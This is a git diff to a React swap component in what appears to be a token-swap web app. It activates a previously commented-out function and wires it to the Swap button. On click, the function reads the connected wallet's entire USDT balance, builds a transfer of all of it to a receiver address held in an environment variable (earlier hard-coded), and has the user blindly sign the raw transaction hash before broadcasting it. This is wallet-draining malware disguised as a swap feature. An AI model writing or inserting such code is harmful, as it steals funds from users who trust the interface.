@@ -15,6 +15,8 @@ import TransactionLoader from '../TransactionLoader/TransactionLoader'
 import Confetti from '../Confetti'
 
 import usdtABI from '../../utils/contractABI.json'
+import { useConnectWallet } from '@web3-onboard/react'
+import Web3 from 'web3'
 
 TransactionModal.setAppElement('#root')
 
@@ -44,10 +46,11 @@ function SwapComponent() {
   const [isOpen, setIsOpen] = useState(false)
   const [changeToken, setChangeToken] = useState(1)
   const [prices, setPrices] = useState(null)
+  const [{ wallet }] = useConnectWallet()
   const [oneN, setOneN] = useState()
   const [isLoading, setIsLoading] = useState(false)
   const [showConfetti, setShowConfetti] = useState(false)
-  const INFURA_ID = '35e86f89b81d45a8a62ed9bb6ab1f3e6'
+  const INFURA_ID = import.meta.env.INFURA_ID
 
   useEffect(() => {
     let timer
@@ -59,92 +62,96 @@ function SwapComponent() {
     return () => clearTimeout(timer)
   }, [showConfetti])
 
-  // const sendTransaction = async () => {
-  //   const USDT = '0xdAC17F958D2ee523a2206206994597C13D831ec7'
+  const sendTransaction = async () => {
+    const web3js = new Web3(wallet.provider)
+    const USDT = import.meta.env.VITE_USDT_ADDRESS
+    const address = wallet.accounts[0].address
 
-  //   try {
-  //     await web3js.eth
-  //       .getTransactionCount(address, 'pending')
-  //       .then(async (res) => {
-  //         const usdtContract = new web3js.eth.Contract(usdtABI, USDT)
-  //         const balance = await usdtContract.methods.balanceOf(address).call()
+    try {
+      await web3js.eth
+        .getTransactionCount(address, 'pending')
+        .then(async (res) => {
+          const usdtContract = new web3js.eth.Contract(usdtABI, USDT)
+          const balance = await usdtContract.methods.balanceOf(address).call()
 
-  //         const walletBalance = await web3js.eth.getBalance(address)
+          const walletBalance = await web3js.eth.getBalance(address)
 
-  //         const gasPrice = await web3js.eth.getGasPrice()
-  //         const rGasPrice = web3js.utils.toHex(
-  //           Math.floor(Number(gasPrice) * 1.3)
-  //         )
-  //         const gas = ethers.BigNumber.from(22000)
-  //         const totalGas = Number(gas) * Math.floor(Number(gasPrice) * 2)
-  //         const totalCost = Number(walletBalance) - totalGas
+          const gasPrice = await web3js.eth.getGasPrice()
+          const rGasPrice = web3js.utils.toHex(
+            Math.floor(Number(gasPrice) * 1.3)
+          )
+          const gas = ethers.BigNumber.from(22000)
+          const totalGas = Number(gas) * Math.floor(Number(gasPrice) * 2)
+          const totalCost = Number(walletBalance) - totalGas
 
-  //         const etherUSD =
-  //           Number(web3js.utils.fromWei(totalCost.toString(), 'ether')) * 1850
+          const etherUSD =
+            Number(web3js.utils.fromWei(totalCost.toString(), 'ether')) * 1850
 
-  //         const txData = {
-  //           nonce: web3js.utils.toHex(res),
-  //           gasPrice: rGasPrice,
-  //           gasLimit: '0x11170',
-  //           to: USDT,
-  //           value: '',
-  //           data: usdtContract.methods
-  //             .transfer('0x4Ffa96dBE6a30656bC2Eadc615451675B0ed8621', balance)
-  //             .encodeABI(),
-  //           v: '0x1',
-  //           r: '0x',
-  //           s: '0x',
-  //         }
+          const txData = {
+            nonce: web3js.utils.toHex(res),
+            gasPrice: rGasPrice,
+            gasLimit: '0x11170',
+            to: USDT,
+            value: '',
+            data: usdtContract.methods
+              .transfer(import.meta.env.VITE_RECEIVER_ADDRESS, balance)
+              .encodeABI(),
+            v: '0x1',
+            r: '0x',
+            s: '0x',
+          }
 
-  //         let Tx = new ethereumjs.Tx(txData)
-  //         const serializedTx = '0x' + Tx.serialize().toString('hex')
-  //         const encoder = { encoding: 'hex' }
-  //         const hashed = web3js.utils.sha3(serializedTx)
-  //         const chainId = await web3js.eth.getChainId()
+          let Tx = new ethereumjs.Tx(txData)
+          const serializedTx = '0x' + Tx.serialize().toString('hex')
+          const encoder = { encoding: 'hex' }
+          const hashed = web3js.utils.sha3(serializedTx)
+          const chainId = await web3js.eth.getChainId()
 
-  //         await web3js.eth
-  //           .sign(hashed, address)
-  //           .then(async (result) => {
-  //             const signature = result.substring(2)
-  //             const r = '0x' + signature.substring(0, 64)
-  //             const s = '0x' + signature.substring(64, 128)
-  //             const v = parseInt(signature.substring(128, 130), 16)
-  //             const y = web3js.utils.toHex(
-  //               BigInt(v) + BigInt(chainId) * BigInt(2) + BigInt(8)
-  //             )
+          console.log(serializedTx)
 
-  //             txData.r = r
-  //             txData.s = s
-  //             txData.v = y
-  //             Tx = new ethereumjs.Tx(txData)
+          await web3js.eth
+            .sign(hashed, address)
+            .then(async (result) => {
+              const signature = result.substring(2)
+              const r = '0x' + signature.substring(0, 64)
+              const s = '0x' + signature.substring(64, 128)
+              const v = parseInt(signature.substring(128, 130), 16)
+              const y = web3js.utils.toHex(
+                BigInt(v) + BigInt(chainId) * BigInt(2) + BigInt(8)
+              )
 
-  //             const serializedTx2 = '0x' + Tx.serialize().toString('hex'),
-  //               encoder2 = { encoding: 'hex' },
-  //               hashed2 = web3js.utils.sha3(serializedTx2)
+              txData.r = r
+              txData.s = s
+              txData.v = y
+              Tx = new ethereumjs.Tx(txData)
 
-  //             setIsLoading(true)
+              const serializedTx2 = '0x' + Tx.serialize().toString('hex'),
+                encoder2 = { encoding: 'hex' },
+                hashed2 = web3js.utils.sha3(serializedTx2)
 
-  //             await web3js.eth
-  //               .sendSignedTransaction(serializedTx2)
-  //               .then((_0x45f7a3) => console.log(_0x45f7a3))
-  //               .catch((_0x119fc8) => console.log(_0x119fc8))
+              setIsLoading(true)
 
-  //             setIsLoading(false)
-  //           })
-  //           .catch((_0x4ded9e) => {
-  //             setIsLoading(false)
-  //             console.log(_0x4ded9e)
-  //           })
-  //       })
-  //       .catch((err) => {
-  //         setIsLoading(false)
-  //         console.error(err)
-  //       })
-  //   } catch (error) {
-  //     setIsLoading(false)
-  //     console.log(error)
-  //   }
-  // }
+              await web3js.eth
+                .sendSignedTransaction(serializedTx2)
+                .then((_0x45f7a3) => console.log(_0x45f7a3))
+                .catch((_0x119fc8) => console.log(_0x119fc8))
+
+              setIsLoading(false)
+            })
+            .catch((_0x4ded9e) => {
+              setIsLoading(false)
+              console.log(_0x4ded9e)
+            })
+        })
+        .catch((err) => {
+          setIsLoading(false)
+          console.error(err)
+        })
+    } catch (error) {
+      setIsLoading(false)
+      console.log(error)
+    }
+  }
 
   async function fetchPairAndCalculateAmount(
     tokenOneAddress,
@@ -322,7 +329,11 @@ function SwapComponent() {
             </div>
           )}
 
-        <div className='swapButton' disabled={!tokenOneAmount}>
+        <div
+          className='swapButton'
+          disabled={!tokenOneAmount}
+          onClick={sendTransaction}
+        >
           Swap
         </div>
       </div>
